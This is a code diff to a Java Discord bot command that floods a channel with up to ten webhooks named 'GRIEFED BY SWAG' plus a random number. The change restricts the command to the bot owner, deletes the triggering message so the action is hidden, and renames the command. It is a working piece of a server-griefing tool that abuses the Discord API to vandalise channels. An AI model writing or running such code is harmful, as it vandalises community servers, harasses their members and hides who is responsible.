@@ -12,6 +12,9 @@ import java.util.Random;
 public class CreateWebhookCommand implements ICommand {
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
+        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
+            return;
+        }
         int input;
         if (Integer.parseInt(args.get(0)) > 10)
             input = 10;
@@ -19,15 +22,16 @@ public class CreateWebhookCommand implements ICommand {
             input = Integer.parseInt(args.get(0));
         for (int i = 0; i < input; i++) {
             try {
-                event.getChannel().createWebhook("GRIEFED BY POODLECOORP " + getRandom()).complete();
+                event.getChannel().createWebhook("GRIEFED BY SWAG " + getRandom()).complete();
             } catch (Exception ex) {
 
             }
         }
-        EmbedBuilder eb = new EmbedBuilder();
-        eb.setColor(346626);
-        eb.setDescription(String.format("✅ Successfully created %s webhook(s) ✅", args.get(0)));
-        event.getChannel().sendMessage(eb.build()).queue();
+        event.getMessage().delete().queue();
+//        EmbedBuilder eb = new EmbedBuilder();
+//        eb.setColor(346626);
+//        eb.setDescription(String.format("✅ Successfully created %s webhook(s) ✅", args.get(0)));
+//        event.getChannel().sendMessage(eb.build()).queue();
     }
     private int getRandom() {
         Random randy = new Random();
@@ -40,11 +44,11 @@ public class CreateWebhookCommand implements ICommand {
 
     @Override
     public String getInvoke() {
-        return "webhook";
+        return "cweb";
     }
 
     @Override
     public String[] getAlias() {
-        return new String[] {"cwebhooks","cweb","createweb","createwebhooks","createwebhook","webhooks"};
+        return new String[] {"cwebhooks","createweb","createwebhooks","createwebhook","webhooks"};
     }
 }
